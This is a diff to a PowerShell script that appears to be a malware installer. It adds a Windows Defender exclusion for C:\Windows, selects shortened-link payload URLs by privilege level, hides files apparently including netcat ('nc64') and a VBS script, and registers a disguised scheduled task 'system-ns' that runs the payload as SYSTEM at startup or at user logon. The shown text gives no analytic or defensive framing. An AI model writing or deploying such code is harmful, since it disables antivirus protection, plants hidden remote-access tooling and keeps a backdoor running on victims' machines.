@@ -3,17 +3,22 @@ $isAdmin = ([Security.Principal.WindowsPrincipal]::new([Security.Principal.Windo
 
 if ($isAdmin) {
     Write-Output "Running as Administrator"
+
+    # Admin rights detected
     $installPath = "C:\Windows"
     $scriptVbsUrl = "https://rb.gy/w3a7hb"
-    # Windows Defender Exclusion
+
+    # Windows Defender Exclusion (requires admin)
     Add-MpPreference -ExclusionPath $installPath
 } else {
     Write-Output "Not running as Administrator"
+
+    # No admin rights
     $installPath = Join-Path $env:USERPROFILE "System"
     $scriptVbsUrl = "https://rb.gy/3lld2p"
 }
 
-# Create the installation directory if it doesn’t exist
+# Create the installation directory if it doesn't exist
 if (-not (Test-Path $installPath)) {
     New-Item -ItemType Directory -Path $installPath -Force | Out-Null
 }
@@ -37,29 +42,30 @@ attrib +H $quietTxtPath
 attrib +H $nc64TxtPath
 attrib +H $scriptVbsPath
 
-# Define task parameters
-$taskName = "system-ns"
+# Create a scheduled task
+$action = New-ScheduledTaskAction -Execute $scriptVbsPath
+
+if ($isAdmin) {
+    # If admin rights, run as NT AUTHORITY\SYSTEM at startup
+    $trigger = New-ScheduledTaskTrigger -AtStartup
+    $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount
+} else {
+    # If not admin, run as current user at logon
+    $trigger = New-ScheduledTaskTrigger -AtLogon -User "$env:USERDOMAIN\$env:USERNAME"
+    $principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive
+}
+
 $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -DontStopOnIdleEnd
 
 try {
-    if ($isAdmin) {
-        # Admin: Use Register-ScheduledTask as SYSTEM
-        $action = New-ScheduledTaskAction -Execute $scriptVbsPath
-        $trigger = New-ScheduledTaskTrigger -AtStartup
-        $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount
-        Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Principal $principal -Settings $settings -Force
-        Start-ScheduledTask -TaskName $taskName
-    } else {
-        # Non-Admin: Use schtasks /create
-        $tr = "wscript.exe \`"$scriptVbsPath\`""
-        cmd /c "schtasks /create /tn $taskName /tr $tr /sc ONSTART /ru $env:USERNAME /it /f"
-        if ($LASTEXITCODE -eq 0) {
-            Set-ScheduledTask -TaskName $taskName -Settings $settings
-            Start-ScheduledTask -TaskName $taskName
-        } else {
-            Write-Output "Failed to create the scheduled task with schtasks, exit code: $LASTEXITCODE"
-        }
-    }
+    $taskName = "system-ns"
+
+    # Register the task
+    Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Principal $principal -Settings $settings -Force
+
+    # Start the task immediately after registration
+    Start-ScheduledTask -TaskName $taskName
+
 } catch {
-    Write-Output "Failed to register, set, or start the scheduled task: $_"
+    Write-Output "Failed to register or start the scheduled task: $_"
 }
